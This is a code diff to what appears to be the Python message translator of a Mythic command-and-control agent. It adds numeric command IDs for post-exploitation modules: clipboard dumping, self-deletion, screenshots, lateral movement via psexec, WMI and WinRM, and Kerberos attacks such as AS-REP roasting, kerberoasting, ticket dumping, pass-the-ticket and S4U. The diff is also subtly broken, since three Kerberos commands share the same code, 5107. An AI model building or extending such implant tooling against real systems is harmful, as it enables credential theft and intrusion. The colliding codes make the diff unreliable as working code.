@@ -8,11 +8,46 @@ import ast
 import logging
 from struct import pack, calcsize
 
-JOB_CHECKIN  = 0xf1;
-JOB_GET_TASK = 0;
-JOB_POST     = 1;
-JOB_NO_JOB   = 4;
-JOB_ERROR    = 5;
+from mythic_container.MythicCommandBase import *
+from mythic_container.MythicRPC import *
+
+KH_CALLBACK_OUTPUT = 0x0
+KH_CALLBACK_ERROR  = 0x0d
+
+JOB_CHECKIN   = 0xf1;
+JOB_GET_TASK  = 0;
+JOB_POST      = 1;
+JOB_NO_JOB    = 4;
+JOB_QUICK_MSG = 5;
+JOB_ERROR     = 6;
+JOB_QUICK_OUT = 7;
+
+BF_WHOAMI     = 5000;
+BF_IPCONFIG   = 5001;
+BF_CLIPDUMP   = 5002;
+BF_SELFDEL    = 5003;
+BF_SCREENSHOT = 5004;
+
+BF_JMP_PSEXEC = 5051;
+BF_JMP_WMI    = 5052;
+BF_JMP_WINRM  = 5053;
+
+BF_KRB_ASREP  = 5101;
+BF_KRB_ASKTGT = 5102;
+BF_KRB_ASKTGS = 5103;
+BF_KRB_DUMP   = 5104;
+BF_KRB_CHNGPW = 5105;
+BF_KRB_KRBRST = 5106;
+BF_KRB_KLIST  = 5107;
+BF_KRB_PTT    = 5107;
+BF_KRB_PURGE  = 5107;
+BF_KRB_S4U    = 5109;
+BF_KRB_RENEW  = 5110;
+BF_KRB_TGTDEL = 5111;
+BF_KRB_TRIAGE = 5112;
+BF_KRB_DESCB  = 5113;
+BF_KRB_HASH   = 5114;
+
 
 SB_INJ_SC   = 30;
 SB_INJ_PE   = 31;
@@ -30,6 +65,7 @@ T_DOTNET    = 19;
 T_SOCKS     = 20;
 T_EXEC_SC   = 21;
 T_EXEC_PE   = 22;
+T_EXEC_BOF  = 23;
 
 SB_DT_INLINE = 5;
 SB_DT_UNLOAD = 6;
@@ -66,7 +102,9 @@ Jobs = {
     "checkin":       {"hex_code": JOB_CHECKIN },
     "get_tasking":   {"hex_code": JOB_GET_TASK },
     "post_response": {"hex_code": JOB_POST },
-    "error":         {"hex_code": JOB_ERROR }
+    "error":         {"hex_code": JOB_ERROR },
+    "quick_msg":     {"hex_code": JOB_QUICK_MSG},
+    "quick_out":     {"hex_code": JOB_QUICK_OUT}
 }
 
 Commands = {
@@ -77,6 +115,7 @@ Commands = {
     "upload":    {"hex_code": T_UPLOAD},
     "download":  {"hex_code": T_DOWNLOAD},
     "info"    :  {"hex_code": T_INFO},
+    "exec-bof":  {"hex_code": T_EXEC_BOF},
     "exec-sc" :  {"hex_code": T_EXEC_SC},
     "exec-pe" :  {"hex_code": T_EXEC_PE},
 
@@ -89,6 +128,34 @@ Commands = {
             "unload": { "sub": SB_DT_UNLOAD },
             "invoke": { "sub": SB_DT_INVOKE }
         }
+    },
+
+    "bof": {
+        "whoami":     {"sub": BF_WHOAMI},
+        "ipconfig":   {"sub": BF_IPCONFIG},
+        "clipdump":   {"sub": BF_CLIPDUMP},
+        "selfdel":    {"sub": BF_SELFDEL},
+        "screenshot": {"sub": BF_SCREENSHOT},
+
+        "psexec":     {"sub": BF_JMP_PSEXEC},
+        "wmi":        {"sub": BF_JMP_WMI},
+        "winrm":      {"sub": BF_JMP_WINRM},
+
+        "krb_asrep":  {"sub": BF_KRB_ASREP},
+        "krb_asktgt": {"sub": BF_KRB_ASKTGT},
+        "krb_asktgs": {"sub": BF_KRB_ASKTGS},
+        "krb_dump":   {"sub": BF_KRB_DUMP},
+        "krb_chngpw": {"sub": BF_KRB_CHNGPW},
+        "krb_krbrst": {"sub": BF_KRB_KRBRST},
+        "krb_klist":  {"sub": BF_KRB_KLIST},
+        "krb_ptt":    {"sub": BF_KRB_PTT},
+        "krb_purge":  {"sub": BF_KRB_PURGE},
+        "krb_s4u":    {"sub": BF_KRB_S4U},
+        "krb_renew":  {"sub": BF_KRB_RENEW},
+        "krb_tgtdel": {"sub": BF_KRB_TGTDEL},
+        "krb_triage": {"sub": BF_KRB_TRIAGE},
+        "krb_descb":  {"sub": BF_KRB_DESCB},
+        "krb_hash":   {"sub": BF_KRB_HASH}
     },
 
     # Exit method
@@ -257,7 +324,7 @@ def is_valid_base64(s: str) -> bool:
         return True
     except:
         return False
-    
+
 def Dbg1( Input:str ) -> None:
     ConcStr = f"CHECKIN => {Input}";
     logging.info(ConcStr)
